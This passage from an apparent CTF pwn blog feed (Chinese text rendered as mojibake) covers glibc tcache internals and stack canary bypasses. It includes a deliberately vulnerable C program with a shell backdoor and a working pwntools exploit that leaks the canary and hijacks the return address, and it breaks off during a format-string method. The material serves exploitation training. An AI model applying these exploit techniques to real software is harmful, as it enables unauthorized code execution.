punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  e<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">++</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_puts()</code>  å®Œæˆäº†æŠŠé‡Šæ”¾çš„ chunk æ’å…¥åˆ°  <code>tcache-&gt;entries[tc_idx]</code>  é“¾è¡¨å¤´éƒ¨çš„æ“ä½œï¼Œä¹Ÿå‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚å¹¶ä¸” <strong>æ²¡æœ‰æŠŠ p ä½ç½®é›¶</strong>ã€‚</p>\n<blockquote>\n<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸º CSDN åšä¸»ã€Œè‘£å“¥çš„é»‘æ¿æŠ¥ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>\nåŸæ–‡é“¾æ¥ï¼š<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1L2FydGljbGUvZGV0YWlscy85Njg2NTMyMQ==\">https://blog.csdn.net/qq_41453285/article/details/96865321</span></p>\n<p>ctf-wiki:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUv\">tcache - CTF Wiki (ctf-wiki.org)</span></p>\n</blockquote>\n",
            "tags": [
                "å †"
            ]
        },
        {
            "id": "http://example.com/2023/08/04/b-canary/",
            "url": "http://example.com/2023/08/04/b-canary/",
            "title": "b_canary",
            "date_published": "2023-08-04T04:02:09.000Z",
            "content_html": "<h1 id=\"canaryä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#canaryä»‹ç»\">#</a> canary ä»‹ç»ï¼š</h1>\n<ol>\n<li>åœ¨å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå‘æ ˆå¸§å†…å‹å…¥ä¸€ä¸ªé¢å¤–çš„éšæœº DWORDï¼Œè¿™ä¸ªéšæœºæ•°è¢«ç§°ä¸º â€œCanaryâ€</li>\n<li>å¦‚æœä½¿ç”¨ IDA åæ±‡ç¼–çš„è¯ï¼Œæ‚¨å¯èƒ½ä¼šçœ‹åˆ° IDA ä¼šå°†è¿™ä¸ªéšæœºæ•°æ ‡æ³¨ä¸º â€œSecurity Cookieâ€ï¼Œåœ¨éƒ¨åˆ†ä¹¦ç±çš„å™è¿°ä¸­ä¼šç”¨ Security Cookie æ¥å¼•ç”¨è¿™ç§éšæœºæ•°</li>\n<li>Canary ä½äº EBP ä¹‹å‰ï¼Œç³»ç»Ÿè¿˜å°†åœ¨å†…å­˜åŒºåŸŸä¸­å­˜æ”¾ä¸€ä¸ª Canary çš„å‰¯æœ¬</li>\n<li>å½“æ ˆä¸­å‘ç”Ÿæº¢å‡ºæ—¶ï¼ŒCanary å°†è¢«é¦–å…ˆæ·¹æ²¡ï¼Œä¹‹åæ‰æ˜¯ EBP å’Œè¿”å›åœ°å€</li>\n<li>åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç³»ç»Ÿå°†æ‰§è¡Œä¸€ä¸ªé¢å¤–çš„å®‰å…¨éªŒè¯æ“ä½œï¼Œè¢«ç§°ä½œ â€œSecurity checkâ€ åœ¨ Security check è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå°†æ¯”è¾ƒæ ˆå¸§ä¸­åŸå…ˆå­˜æ”¾çš„ Canary å’Œåœ¨å†…å­˜ä¸­çš„å‰¯æœ¬ï¼Œå¦‚æœä¸¤è€…ä¸ç¬¦åˆï¼Œè¯´æ˜æ ˆå¸§ä¸­çš„ Canary å·²è¢«ç ´åï¼Œå³æ ˆä¸­å‘ç”Ÿäº†æº¢å‡º</li>\n<li>å½“æ£€æµ‹åˆ°æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºæ—¶ï¼Œç³»ç»Ÿå°†è¿›å…¥å¼‚å¸¸å¤„ç†æµç¨‹ï¼Œå‡½æ•°ä¸ä¼šè¢«æ­£å¸¸è¿”å›ï¼Œret æŒ‡ä»¤ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œ</li>\n</ol>\n<h3 id=\"æ–¹æ³•ä¸€-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–canary\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•ä¸€-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–canary\">#</a> æ–¹æ³•ä¸€ è¦†ç›–æˆªæ–­å­—ç¬¦è·å– Canary</h3>\n<h5 id=\"åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†\">#</a> åŸç†</h5>\n<p>Canary è®¾è®¡å…¶ä½å­—èŠ‚ä¸º \\x00ï¼Œæœ¬æ„æ˜¯é˜»æ­¢è¢« readã€write ç­‰å‡½æ•°ç›´æ¥å°† Canary è¯»å‡ºæ¥ã€‚é€šè¿‡æ ˆæº¢å‡ºå°†ä½ä½çš„ \\x00 è¦†å†™ï¼Œå°±å¯ä»¥è¯»å‡º Canary çš„å€¼ã€‚</p>\n<p>ä»ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ¢³ç†å‡ºç»•è¿‡çš„æ€è·¯ï¼š</p>\n<p>æ„é€ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œè¦†å†™ Canary ä½å­—èŠ‚ \\x00ï¼Œè¯»å–å‡º Canary å€¼<br>\næ„é€ ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œåˆ©ç”¨è·å–çš„ Canary é‡æ–°æ„é€  payloadï¼Œè·å– shellã€‚</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// x00cannary.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ç¼–è¯‘ç”Ÿæˆ 32 ä¸ºçš„ ELF æ–‡ä»¶</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc x00cannary.c -no-pie <span class=\"token parameter variable\">-m32</span> -fstack-protector <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-o</span> x00canary</pre></td></tr></table></figure><h6 id=\"æŸ¥çœ‹ä¿æŠ¤\"><a class=\"markdownIt-Anchor\" href=\"#æŸ¥çœ‹ä¿æŠ¤\">#</a> æŸ¥çœ‹ä¿æŠ¤</h6>\n<p><img data-src=\"/img/canary/image-20230804091104686.png\" alt=\"image-20230804091104686\"></p>\n<h6 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804091402007.png\" alt=\"image-20230804091402007\"></p>\n<p><img data-src=\"/img/canary/image-20230804091406354.png\" alt=\"image-20230804091406354\"></p>\n<p>ä¼šå‘ç°æœ‰åé—¨å‡½æ•°ï¼Œå¹¶ä¸” v3 æ˜¯æˆ‘ä»¬çš„ canaryã€‚åœ¨ read å‡½æ•°ä¸­æœ‰å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ã€‚</p>\n<p>è¿™é¢˜å¼€å¯äº†çš„ Canaryï¼Œæ‰€ä»¥ç›´æ¥è¿›è¡Œæ ˆæº¢å‡ºè‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚</p>\n<ul>\n<li>æ„é€ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œè¦†å†™ Canary ä½å­—èŠ‚ \\x00ï¼Œè¯»å–å‡º Canary å€¼ï¼Œä»æ ˆé¡¶åˆ° Canary ä½å­—èŠ‚çš„è·ç¦»åº”è¯¥æ˜¯ 0x70 - 0xcã€‚</li>\n</ul>\n<ul>\n<li>æ„é€ ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œåˆ©ç”¨æ³„éœ²çš„ canary è¿›è¡Œæ ˆæº¢å‡º.</li>\n</ul>\n<p>æ ˆé¡¶åˆ° ebp çš„è·ç¦»æ˜¯ 0x70ï¼ŒCanary åˆ° ebp çš„è·ç¦»æ˜¯ 0xcï¼Œå› æ­¤è¦†ç›– Canary ä¹‹åï¼Œè¿˜è¦é¢å¤–å¢åŠ  0x8 çš„å­—èŠ‚ï¼Œå†åŠ ä¸Š ebp æœ¬èº«é•¿åº¦ 0x4ï¼Œæ‰€ä»¥è¦é¢å¤–å¢åŠ  0xC çš„å­—èŠ‚å†…å®¹ã€‚</p>\n<h6 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>getshell <span class=\"token operator\">=</span> <span class=\"token number\">0x80485A6</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Hello Hacker!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>recvbytes <span class=\"token operator\">=</span> rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>recvbytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># è·å– canary</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>canary <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xa</span><span class=\"token comment\">#ç»è¿‡è°ƒè¯•å‘ç°ä½å­—èŠ‚è¢«è¦†ç›–äº† 0xaï¼Œæ•…å‡å» 0xa å³å¯</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'Canary: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># ç¬¬äºŒæ¬¡æº¢å‡º</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xc</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>getshell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"æ–¹æ³•äºŒ-åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–canary\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•äºŒ-åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–canary\">#</a> æ–¹æ³•äºŒ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å– Canary</h3>\n<h4 id=\"åŸç†-2\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†-2\">#</a> åŸç†</h4>\n<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥æ‰“å°å‡ºæ ˆä¸­çš„å†…å®¹ï¼Œå› æ­¤åˆ©ç”¨æ­¤æ¼æ´å¯ä»¥æ‰“å°å‡º canary çš„å€¼ï¼Œä»è€Œè¿›è¡Œæ ˆæº¢å‡ºã€‚</p>\n<h4 id=\"bjdctf_2020_babyrop2buuctfåœ¨çº¿è¯„æµ‹-buuojcn\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_babyrop2buuctfåœ¨çº¿è¯„æµ‹-buuojcn\">#</a> [bjdctf_2020_babyrop2](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2JqZGN0Zl8yMDIwX2JhYnlyb3Ay\">BUUCTF åœ¨çº¿è¯„æµ‹ (buuoj.cn)</span>)</h4>\n<p>â€‹\t\tprintf æ³„éœ²å¹¶åœ¨è¦†ç›– canary</p>\n<h6 id=\"æ£€æŸ¥ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥ç¨‹åº\">#</a> æ£€æŸ¥ç¨‹åº</h6>\n<p><img data-src=\"/img/canary/canary1.png\" alt=\"image-20230608154555021\"></p>\n<p><img data-src=\"/img/canary/image-20230608154744048.png\" alt=\"image-20230608154744048\"></p>\n<h6 id=\"ida-2\"><a class=\"markdownIt-Anchor\" href=\"#ida-2\">#</a> IDA</h6>\n<ul>\n<li>gift å‡½æ•°</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608154908039.png\" alt=\"image-20230608154908039\"></p>\n<ul>\n<li>vlun å‡½æ•°</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608155218476.png\" alt=\"image-20230608155218476\"></p>\n<ol>\n<li>gitf å‡½æ•°å¾ˆæ˜æ˜¾æœ‰æ ¼å¼è¯å­—ä¸²æº¢å‡ºï¼Œå¯ä»¥åˆ©ç”¨å»æ³„éœ² canaryã€‚</li>\n<li>å°†æ³„éœ²çš„ canary å»è¦†å†™åœ¨ buf ä¸Šï¼Œä»è€Œè¾¾åˆ°ç›®çš„</li>\n</ol>\n<p>é‚£ä¹ˆç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ª system (/bin/sh) å°±å¯ä»¥è¾¾åˆ°ç›®çš„äº†ã€‚</p>\n<p><img data-src=\"/img/canary/image-20230608155517052.png\" alt=\"image-20230608155517052\"></p>\n<p><img data-src=\"/img/canary/image-20230608155613180.png\" alt=\"image-20230608155613180\"></p>\n<p>å½“æˆ‘æ£€æŸ¥å­—ç¬¦ä¸²æ—¶ï¼Œå¹¶æ²¡æœ‰ /bin/sh å’Œ system å‡½æ•° plt è¡¨é¡¹ï¼Œæ‰€ä»¥éœ€è¦æˆ‘æ³„éœ² libcï¼Œå»æ„å»º systemï¼ˆ/bin/shï¼‰</p>\n<p>å¥½ï¼Œæˆ‘ä»¬æ‰€æœ‰çš„å¤§è‡´æ€è·¯æœ‰äº†ï¼Œæ¥ä¸‹æ¥ï¼Œå°±æ˜¯ç»†èŠ‚ä¸ŠåŠŸå¤«äº†ã€‚</p>\n<p>æ³„éœ² canary</p>\n<p>æˆ‘ä»¬éœ€è¦é€šè¿‡ gdb è°ƒè¯•ï¼ˆéœ€è¦ gdb ä¸ pwndbg è”åˆè°ƒè¯•ï¼Œå¦‚æœ gdb æ²¡æœ‰ fmtarg å‘½ä»¤çš„æˆ–ï¼Œéœ€è¦é€šè¿‡ä¸‹é¢è¿æ¥å»è°ƒæ•´ã€‚</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMi9hcnRpY2xlL2RldGFpbHMvMTA1NjQ4NzY5\">gdb+pwndbg è”åˆè°ƒè¯•</span></p>\n<p><img data-src=\"/img/canary/image-20230608160451473.png\" alt=\"image-20230608160451473\"></p>\n<p>å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²è·ç¦» rbp æœ‰ 5 çš„åç§»ï¼Œå› ä¸ºæ—¶ 64 ä½ç¨‹åºï¼Œå‰ 6 ä¸ªå‚æ•°éœ€è¦æ”¾åˆ°å¯„å­˜å™¨å†…ï¼Œæ‰€ä»¥è·ç¦» canary çš„è·ç¦»å°±æœ‰ï¼ˆ5 + 6ï¼‰çš„åç§»ã€‚</p>\n<p>æ‰€ä»¥æ„é€ çš„ç¬¬ä¸€ä»½ payload1 